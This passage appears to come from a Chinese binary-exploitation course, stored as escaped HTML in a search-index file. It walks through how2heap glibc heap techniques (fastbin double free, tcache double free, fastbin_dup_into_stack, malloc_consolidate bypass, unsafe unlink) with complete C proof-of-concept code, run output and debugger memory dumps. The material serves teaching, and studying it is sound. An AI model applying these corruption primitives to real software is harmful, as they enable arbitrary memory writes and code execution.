\u6cc4\u6f0f\u51fa\u4e00\u4e2a\u5806\u5757\u7684\u6307\u9488\u3002</p> <p>\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff1a</p> <pre><code>$ gcc -fsanitize=address -g fastbin_dup.c\n$ ./a.out\nAllocating 3 buffers.\n1st malloc(9) 0x60200000eff0 points to AAAAAAAA\n2nd malloc(9) 0x60200000efd0 points to BBBBBBBB\n3rd malloc(9) 0x60200000efb0 points to CCCCCCCC\nFreeing the first one 0x60200000eff0.\nThen freeing another one 0x60200000efd0.\nFreeing the first one 0x60200000eff0 again.\n=================================================================\n==5650==ERROR: AddressSanitizer: attempting double-free on 0x60200000eff0 in thread T0:\n    #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)\n    #1 0x400ba3 in main /home/firmy/how2heap/fastbin_dup.c:22\n    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #3 0x400878 in _start (/home/firmy/how2heap/a.out+0x400878)\n\n0x60200000eff0 is located 0 bytes inside of 9-byte region [0x60200000eff0,0x60200000eff9)\nfreed by thread T0 here:\n    #0 0x7fdc18ebf2ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)\n    #1 0x400b0d in main /home/firmy/how2heap/fastbin_dup.c:18\n    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n\npreviously allocated by thread T0 here:\n    #0 0x7fdc18ebf602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)\n    #1 0x400997 in main /home/firmy/how2heap/fastbin_dup.c:7\n    #2 0x7fdc18a7d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n</code></pre> <p>\u4e00\u4e2a\u5f88\u660e\u663e\u7684 double-free \u6f0f\u6d1e\u3002\u5173\u4e8e\u8fd9\u7c7b\u6f0f\u6d1e\u7684\u8be6\u7ec6\u5229\u7528\u8fc7\u7a0b\uff0c\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u7ae0\u8282\u91cc\u518d\u8bb2\u3002</p> <p>\u770b\u4e00\u70b9\u65b0\u9c9c\u7684\uff0c\u5728 libc-2.26 \u4e2d\uff0c\u5373\u4f7f\u4e24\u6b21 free\uff0c\u4e5f\u5e76\u6ca1\u6709\u89e6\u53d1 double-free \u7684\u5f02\u5e38\u68c0\u6d4b\uff0c\u8fd9\u4e0e tcache \u673a\u5236\u6709\u5173\uff0c\u4ee5\u540e\u4f1a\u8be6\u7ec6\u8bb2\u8ff0\u3002\u8fd9\u91cc\u5148\u770b\u4e2a\u80fd\u591f\u5728\u8be5\u7248\u672c\u4e0b\u89e6\u53d1 double-free \u7684\u4f8b\u5b50\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    int i;\n\n    void *p = malloc(0x40);\n    fprintf(stderr, \"First allocate a fastbin: p=%p\\n\", p);\n\n    fprintf(stderr, \"Then free(p) 7 times\\n\");\n    for (i = 0; i &lt; 7; i++) {\n        fprintf(stderr, \"free %d: %p =&gt; %p\\n\", i+1, &amp;p, p);\n        free(p);\n    }\n\n    fprintf(stderr, \"Then malloc 8 times at the same address\\n\");\n    int *a[10];\n    for (i = 0; i &lt; 8; i++) {\n        a[i] = malloc(0x40);\n        fprintf(stderr, \"malloc %d: %p =&gt; %p\\n\", i+1, &amp;a[i], a[i]);\n    }\n\n    fprintf(stderr, \"Finally trigger double-free\\n\");\n    for (i = 0; i &lt; 2; i++) {\n        fprintf(stderr, \"free %d: %p =&gt; %p\\n\", i+1, &amp;a[i], a[i]);\n        free(a[i]);\n    }\n}\n$ gcc -g tcache_double-free.c\n$ ./a.out\nFirst allocate a fastbin: p=0x559e30950260\nThen free(p) 7 times\nfree 1: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 2: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 3: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 4: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 5: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 6: 0x7ffc498b2958 =&gt; 0x559e30950260\nfree 7: 0x7ffc498b2958 =&gt; 0x559e30950260\nThen malloc 8 times at the same address\nmalloc 1: 0x7ffc498b2960 =&gt; 0x559e30950260\nmalloc 2: 0x7ffc498b2968 =&gt; 0x559e30950260\nmalloc 3: 0x7ffc498b2970 =&gt; 0x559e30950260\nmalloc 4: 0x7ffc498b2978 =&gt; 0x559e30950260\nmalloc 5: 0x7ffc498b2980 =&gt; 0x559e30950260\nmalloc 6: 0x7ffc498b2988 =&gt; 0x559e30950260\nmalloc 7: 0x7ffc498b2990 =&gt; 0x559e30950260\nmalloc 8: 0x7ffc498b2998 =&gt; 0x559e30950260\nFinally trigger double-free\nfree 1: 0x7ffc498b2960 =&gt; 0x559e30950260\nfree 2: 0x7ffc498b2968 =&gt; 0x559e30950260\ndouble free or corruption (fasttop)\n[2]    1244 abort (core dumped)  ./a.out\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#fastbin_dup_into_stack","title":"fastbin_dup_into_stack","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    unsigned long long stack_var = 0x21;\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 4 buffers.\\n\");\n    unsigned long long *d = malloc(9);\n    *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));\n    fprintf(stderr, \"4nd malloc(9) %p points to %p\\n\", d, &amp;d);\n    char *e = malloc(9);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    char *f = malloc(9);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s\\n\", f, f);\n    char *g = malloc(9);\n    strcpy(g, \"GGGGGGGG\");\n    fprintf(stderr, \"7th malloc(9) %p points to %s\\n\", g, g);\n}\n$ gcc -g fastbin_dup_into_stack.c\n$ ./a.out\nAllocating 3 buffers.\n1st malloc(9) 0xcf2010 points to AAAAAAAA\n2nd malloc(9) 0xcf2030 points to BBBBBBBB\n3rd malloc(9) 0xcf2050 points to CCCCCCCC\nFreeing the first one 0xcf2010.\nThen freeing another one 0xcf2030.\nFreeing the first one 0xcf2010 again.\nAllocating 4 buffers.\n4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0\n5nd malloc(9) 0xcf2030 points to EEEEEEEE\n6rd malloc(9) 0xcf2010 points to FFFFFFFF\n7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u901a\u8fc7\u4fee\u6539 fd \u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a\u4f2a\u9020\u7684 free chunk\uff0c\u5728\u4f2a\u9020\u7684\u5730\u5740\u5904 malloc \u51fa\u4e00\u4e2a chunk\u3002\u8be5\u7a0b\u5e8f\u5927\u90e8\u5206\u5185\u5bb9\u90fd\u548c\u4e0a\u4e00\u4e2a\u7a0b\u5e8f\u4e00\u6837\uff0c\u6f0f\u6d1e\u4e5f\u540c\u6837\u662f double-free\uff0c\u53ea\u6709\u7ed9 fd \u586b\u5145\u7684\u5185\u5bb9\u4e0d\u4e00\u6837\u3002</p> <p>\u4e09\u4e2a malloc \u4e4b\u540e\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a\n0x602010:   0x4141414141414141  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1 &lt;-- top chunk\n0x602070:   0x0000000000000000\n</code></pre> <p>\u4e09\u4e2a free \u4e4b\u540e\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]\n0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]\n0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  \u2192  [loop detected]\n</code></pre> <p>\u8fd9\u4e00\u6b21 malloc \u4e4b\u540e\uff0c\u6211\u4eec\u4e0d\u518d\u586b\u5145\u65e0\u610f\u4e49\u7684 \"DDDDDDDD\"\uff0c\u800c\u662f\u586b\u5145\u4e00\u4e2a\u5730\u5740\uff0c\u5373\u6808\u5730\u5740\u51cf\u53bb 0x8\uff0c\u4ece\u800c\u5728\u6808\u4e0a\u4f2a\u9020\u51fa\u4e00\u4e2a free \u7684 chunk\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u7684\u5730\u5740\uff09\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48 <code>stack_var</code> \u88ab\u6211\u4eec\u8bbe\u7f6e\u4e3a <code>0x21</code>\uff08\u6216<code>0x20</code>\u90fd\u53ef\u4ee5\uff09\uff0c\u5176\u5b9e\u662f\u4e3a\u4e86\u5728\u6808\u5730\u5740\u51cf\u53bb 0x8 \u7684\u65f6\u5019\u4f5c\u4e3a fake chunk \u7684 size \u5b57\u6bb5\u3002</p> <p>glibc \u5728\u6267\u884c\u5206\u914d\u64cd\u4f5c\u65f6\uff0c\u82e5\u5757\u7684\u5927\u5c0f\u7b26\u5408 fast bin\uff0c\u5219\u4f1a\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u5bfb\u627e\u5408\u9002\u7684\u5757\uff0c\u6b64\u65f6 glibc \u5c06\u6839\u636e\u5019\u9009\u5757\u7684 size \u5b57\u6bb5\u8ba1\u7b97\u51fa fastbin \u7d22\u5f15\uff0c\u7136\u540e\u4e0e\u5bf9\u5e94 bin \u5728 fastbin \u4e2d\u7684\u7d22\u5f15\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u4e8c\u8005\u4e0d\u5339\u914d\uff0c\u5219\u8bf4\u660e\u5757\u7684 size \u5b57\u6bb5\u906d\u5230\u7834\u574f\u3002\u6240\u4ee5\u9700\u8981 fake chunk \u7684 size \u5b57\u6bb5\u88ab\u8bbe\u7f6e\u4e3a\u6b63\u786e\u7684\u503c\u3002</p> <pre><code>/* offset 2 to use otherwise unindexable first 2 bins */\n#define fastbin_index(sz) \\\n  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)\n\n  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))\n    {\n      idx = fastbin_index (nb);\n      [...]\n\n      if (victim != 0)\n        {\n          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))\n            {\n              errstr = \"malloc(): memory corruption (fast)\";\n              [...]\n            }\n            [...]\n        }\n    }\n</code></pre> <p>\u7b80\u5355\u5730\u8bf4\u5c31\u662f fake chunk \u7684 size \u4e0e double-free \u7684 chunk \u7684 size \u76f8\u540c\u5373\u53ef\u3002</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk d\n0x602010:   0x00007fffffffdc30  0x0000000000000000      &lt;-- fd pointer\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]\n0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer\n0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  p &amp;stack_var\n$4 = (unsigned long long *) 0x7fffffffdc38\ngef\u27a4  x/5gx 0x7fffffffdc38-0x8\n0x7fffffffdc30: 0x0000000000000000  0x0000000000000021 &lt;-- fake chunk [seems to be freed]\n0x7fffffffdc40: 0x0000000000602010  0x0000000000602010      &lt;-- fd pointer\n0x7fffffffdc50: 0x0000000000602030\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index]\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u4f2a\u9020\u7684 chunk \u5df2\u7ecf\u7531\u6307\u9488\u94fe\u63a5\u5230 fastbins \u4e0a\u4e86\u3002\u4e4b\u540e malloc \u4e24\u6b21\uff0c\u5373\u53ef\u5c06\u4f2a\u9020\u7684 chunk \u79fb\u52a8\u5230\u94fe\u8868\u5934\u90e8\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4646464646464646  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x4545454545454545  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000021\n0x602050:   0x4343434343434343  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000020fa1\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x7fffffffdc40, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x602020, size=0x0, flags=) [incorrect fastbin_index]\n</code></pre> <p>\u518d\u6b21 malloc\uff0c\u5373\u53ef\u5728 fake chunk \u5904\u5206\u914d\u5185\u5b58\uff1a</p> <pre><code>gef\u27a4  x/5gx 0x7fffffffdc38-0x8\n0x7fffffffdc30: 0x0000000000000000  0x0000000000000021 &lt;-- fake chunk\n0x7fffffffdc40: 0x4747474747474747  0x0000000000602000\n0x7fffffffdc50: 0x0000000000602030\n</code></pre> <p>\u6240\u4ee5\u5bf9\u4e8e fastbins\uff0c\u53ef\u4ee5\u901a\u8fc7 double-free \u8986\u76d6 fastbins \u7684\u7ed3\u6784\uff0c\u6765\u83b7\u5f97\u4e00\u4e2a\u6307\u5411\u4efb\u610f\u5730\u5740\u7684\u6307\u9488\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#fastbin_dup_consolidate","title":"fastbin_dup_consolidate","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    void *p1 = malloc(0x10);\n    void *p2 = malloc(0x10);\n    strcpy(p1, \"AAAAAAAA\");\n    strcpy(p2, \"BBBBBBBB\");\n    fprintf(stderr, \"Allocated two fastbins: p1=%p p2=%p\\n\", p1, p2);\n\n    fprintf(stderr, \"Now free p1!\\n\");\n    free(p1);\n\n    void *p3 = malloc(0x400);\n    fprintf(stderr, \"Allocated large bin to trigger malloc_consolidate(): p3=%p\\n\", p3);\n    fprintf(stderr, \"In malloc_consolidate(), p1 is moved to the unsorted bin.\\n\");\n\n    free(p1);\n    fprintf(stderr, \"Trigger the double free vulnerability!\\n\");\n    fprintf(stderr, \"We can pass the check in malloc() since p1 is not fast top.\\n\");\n\n    void *p4 = malloc(0x10);\n    strcpy(p4, \"CCCCCCC\");\n    void *p5 = malloc(0x10);\n    strcpy(p5, \"DDDDDDDD\");\n    fprintf(stderr, \"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\\n\", p4, p5);\n}\n$ gcc -g fastbin_dup_consolidate.c\n$ ./a.out\nAllocated two fastbins: p1=0x17c4010 p2=0x17c4030\nNow free p1!\nAllocated large bin to trigger malloc_consolidate(): p3=0x17c4050\nIn malloc_consolidate(), p1 is moved to the unsorted bin.\nTrigger the double free vulnerability!\nWe can pass the check in malloc() since p1 is not fast top.\nNow p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u5229\u7528\u5728 large bin \u7684\u5206\u914d\u4e2d malloc_consolidate \u673a\u5236\u7ed5\u8fc7 fastbin \u5bf9 double free \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u5728 fastbin_dup \u4e2d\u5df2\u7ecf\u5c55\u793a\u8fc7\u4e86\uff0c\u53ea\u4e0d\u8fc7\u5b83\u5229\u7528\u7684\u662f\u5728\u4e24\u6b21 free \u4e2d\u95f4\u63d2\u5165\u4e00\u6b21\u5bf9\u5176\u5b83 chunk \u7684 free\u3002</p> <p>\u9996\u5148\u5206\u914d\u4e24\u4e2a fast chunk\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1\n0x602010:   0x4141414141414141  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  &lt;-- top chunk\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\n</code></pre> <p>\u91ca\u653e\u6389 p1\uff0c\u5219\u7a7a\u95f2 chunk \u52a0\u5165\u5230 fastbins \u4e2d\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed]\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  &lt;-- top chunk\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n</code></pre> <p>\u6b64\u65f6\u5982\u679c\u6211\u4eec\u518d\u6b21\u91ca\u653e p1\uff0c\u5fc5\u7136\u89e6\u53d1 double free \u5f02\u5e38\uff0c\u7136\u800c\uff0c\u5982\u679c\u6b64\u65f6\u5206\u914d\u4e00\u4e2a large chunk\uff0c\u6548\u679c\u5982\u4e0b\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed]\n0x602010:   0x00007ffff7dd1b88  0x00007ffff7dd1b88      &lt;-- fd, bk pointer\n0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10] 0x00\ngef\u27a4  heap bins small\n[ Small Bins for arena 'main_arena' ]\n[+] small_bins[1]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n[+] Found 1 chunks in 1 small non-empty bins.\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 fastbins \u4e2d\u7684 chunk \u5df2\u7ecf\u4e0d\u89c1\u4e86\uff0c\u53cd\u800c\u51fa\u73b0\u5728\u4e86 small bins \u4e2d\uff0c\u5e76\u4e14 chunk p2 \u7684 prev_size \u548c size \u5b57\u6bb5\u90fd\u88ab\u4fee\u6539\u3002</p> <p>\u770b\u4e00\u4e0b large chunk \u7684\u5206\u914d\u8fc7\u7a0b\uff1a</p> <pre><code>  /*\n     If this is a large request, consolidate fastbins before continuing.\n     While it might look excessive to kill all fastbins before\n     even seeing if there is space available, this avoids\n     fragmentation problems normally associated with fastbins.\n     Also, in practice, programs tend to have runs of either small or\n     large requests, but less often mixtures, so consolidation is not\n     invoked all that often in most programs. And the programs that\n     it is called frequently in otherwise tend to fragment.\n   */\n\n  else\n    {\n      idx = largebin_index (nb);\n      if (have_fastchunks (av))\n        malloc_consolidate (av);\n    }\n</code></pre> <p>\u5f53\u5206\u914d large chunk \u65f6\uff0c\u9996\u5148\u6839\u636e chunk \u7684\u5927\u5c0f\u83b7\u5f97\u5bf9\u5e94\u7684 large bin \u7684 index\uff0c\u63a5\u7740\u5224\u65ad\u5f53\u524d\u5206\u914d\u533a\u7684 fast bins \u4e2d\u662f\u5426\u5305\u542b chunk\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528 malloc_consolidate() \u51fd\u6570\u5408\u5e76 fast bins \u4e2d\u7684 chunk\uff0c\u5e76\u5c06\u8fd9\u4e9b\u7a7a\u95f2 chunk \u52a0\u5165 unsorted bin \u4e2d\u3002\u56e0\u4e3a\u8fd9\u91cc\u5206\u914d\u7684\u662f\u4e00\u4e2a large chunk\uff0c\u6240\u4ee5 unsorted bin \u4e2d\u7684 chunk \u6309\u7167\u5927\u5c0f\u88ab\u653e\u56de small bins \u6216 large bins \u4e2d\u3002</p> <p>\u7531\u4e8e\u6b64\u65f6 p1 \u5df2\u7ecf\u4e0d\u5728 fastbins \u7684\u9876\u90e8\uff0c\u53ef\u4ee5\u518d\u6b21\u91ca\u653e p1\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [double freed]\n0x602010:   0x0000000000000000  0x00007ffff7dd1b88\n0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\ngef\u27a4  heap bins small\n[ Small Bins for arena 'main_arena' ]\n[+] small_bins[1]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n[+] Found 1 chunks in 1 small non-empty bins.\n</code></pre> <p>p1 \u88ab\u518d\u6b21\u653e\u5165 fastbins\uff0c\u4e8e\u662f p1 \u540c\u65f6\u5b58\u5728\u4e8e fabins \u548c small bins \u4e2d\u3002</p> <p>\u7b2c\u4e00\u6b21 malloc\uff0cchunk \u5c06\u4ece fastbins \u4e2d\u53d6\u51fa\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p1 [be freed], chunk p4\n0x602010:   0x0043434343434343  0x00007ffff7dd1b88\n0x602020:   0x0000000000000020  0x0000000000000020  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10] 0x00\ngef\u27a4  heap bins small\n[ Small Bins for arena 'main_arena' ]\n[+] small_bins[1]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)\n[+] Found 1 chunks in 1 small non-empty bins.\n</code></pre> <p>\u7b2c\u4e8c\u6b21 malloc\uff0cchunk \u4ece small bins \u4e2d\u53d6\u51fa\uff1a</p> <pre><code>gef\u27a4  x/15gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000021  &lt;-- chunk p4, chunk p5\n0x602010:   0x4444444444444444  0x00007ffff7dd1b00\n0x602020:   0x0000000000000020  0x0000000000000021  &lt;-- chunk p2\n0x602030:   0x4242424242424242  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000411  &lt;-- chunk p3\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000\n</code></pre> <p>chunk p4 \u548c p5 \u5728\u540c\u4e00\u4f4d\u7f6e\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#unsafe_unlink","title":"unsafe_unlink","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n\nuint64_t *chunk0_ptr;\n\nint main() {\n    int malloc_size = 0x80; // not fastbins\n    int header_size = 2;\n\n    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0\n    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1\n    fprintf(stderr, \"The global chunk0_ptr is at %p, pointing to %p\\n\", &amp;chunk0_ptr, chunk0_ptr);\n    fprintf(stderr, \"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr);\n\n    // pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n    chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3);\n    chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2);\n    fprintf(stderr, \"Fake chunk fd: %p\\n\", (void*) chunk0_ptr[2]);\n    fprintf(stderr, \"Fake chunk bk: %p\\n\\n\", (void*) chunk0_ptr[3]);\n    // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n    // chunk0_ptr[1] = 0x0; // or 0x8, 0x80\n\n    uint64_t *chunk1_hdr = chunk1_ptr - header_size;\n    chunk1_hdr[0] = malloc_size;\n    chunk1_hdr[1] &amp;= ~1;\n\n    // deal with tcache\n    // int *a[10];\n    // int i;\n    // for (i = 0; i &lt; 7; i++) {\n    //   a[i] = malloc(0x80);\n    // }\n    // for (i = 0; i &lt; 7; i++) {\n    //   free(a[i]);\n    // }\n    free(chunk1_ptr);\n\n    char victim_string[9];\n    strcpy(victim_string, \"AAAAAAAA\");\n    chunk0_ptr[3] = (uint64_t) victim_string;\n    fprintf(stderr, \"Original value: %s\\n\", victim_string);\n\n    chunk0_ptr[0] = 0x4242424242424242LL;\n    fprintf(stderr, \"New Value: %s\\n\", victim_string);\n}\n$ gcc -g unsafe_unlink.c\n$ ./a.out\nThe global chunk0_ptr is at 0x601070, pointing to 0x721010\nThe victim chunk we are going to corrupt is at 0x7210a0\n\nFake chunk fd: 0x601058\nFake chunk bk: 0x601060\n\nOriginal value: AAAAAAAA\nNew Value: BBBBBBBB\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u5c55\u793a\u4e86\u600e\u6837\u5229\u7528 free \u6539\u5199\u5168\u5c40\u6307\u9488 chunk0_ptr \u8fbe\u5230\u4efb\u610f\u5185\u5b58\u5199\u7684\u76ee\u7684\uff0c\u5373 unsafe unlink\u3002\u8be5\u6280\u672f\u6700\u5e38\u89c1\u7684\u5229\u7528\u573a\u666f\u662f\u6211\u4eec\u6709\u4e00\u4e2a\u53ef\u4ee5\u6ea2\u51fa\u6f0f\u6d1e\u548c\u4e00\u4e2a\u5168\u5c40\u6307\u9488\u3002</p> <p>Ubuntu16.04 \u4f7f\u7528 libc-2.23\uff0c\u5176\u4e2d unlink \u5b9e\u73b0\u7684\u4ee3\u7801\u5982\u4e0b\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u5bf9\u524d\u540e\u5806\u5757\u7684\u68c0\u67e5\uff0c\u4e5f\u662f\u6211\u4eec\u9700\u8981\u7ed5\u8fc7\u7684\uff1a</p> <pre><code>/* Take a chunk 